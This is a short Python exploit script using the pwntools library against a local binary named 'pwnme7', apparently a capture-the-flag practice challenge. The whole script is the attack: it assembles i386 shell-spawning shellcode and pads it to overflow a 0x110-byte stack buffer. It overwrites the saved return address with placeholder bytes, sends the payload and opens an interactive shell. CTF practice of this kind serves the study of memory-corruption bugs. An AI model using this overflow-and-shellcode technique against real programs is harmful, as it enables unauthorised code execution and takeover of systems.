from pwn import *

context.arch = "i386"
b = process('./pwnme7')

shell   = asm(shellcraft.sh())
padding = b'A' * (0x110 - len(shell))
payload = shell + padding + b'B' * 4

b.sendline(payload)
b.interactive()